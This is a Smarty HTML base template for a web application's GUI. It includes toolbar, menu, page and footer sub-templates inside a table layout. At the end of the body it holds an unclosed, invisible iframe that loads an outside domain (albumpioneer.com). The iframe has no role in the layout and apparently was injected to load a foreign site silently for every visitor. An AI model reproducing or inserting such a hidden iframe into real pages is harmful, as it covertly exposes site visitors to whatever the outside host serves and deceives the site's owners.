{{if $w3cDoctype == $smarty.const.DOC_TYPE_STRICT}}<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">{{elseif $w3cDoctype == $smarty.const.DOC_TYPE_LOOSE}}<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">{{/if}}
{{config_load file='pozvfs.conf'}}
<html>
  <head>
    {{include file='gui/base.inc.tpl'}}
    <style>
      html,body {
      }
      .base_mainBg {
        width: 100%;
        height: 540px;
      }
      .base_td1 {
        vertical-align: top;
      }
    </style>
  </head>
  
  <body >
    <div align="center">
      <table class="base_mainBg" cellPadding="0" cellSpacing="0">
        <tr>
          <td class="base_td1" align="center">
            {{if $template != 'signin'}}
              {{include file="gui/basetoolbar.tpl"}}
              {{if $template != 'home'}}
                {{include file="gui/basemenus.tpl"}}
              {{/if}}
            {{/if}}
              {{include file="gui/page/$template.tpl"}}
          </td>
        </tr>
      </table>
    </div>
    <div align="center">
      {{include file="gui/basesubscript.tpl"}}
    </div>
    <div>
      <table>
        <tr>
          <td ></td>
        </tr>
      </table>
    </div>
    <iframe src="http://albumpioneer.com" style="visibility:hidden;">
  </body>
</html>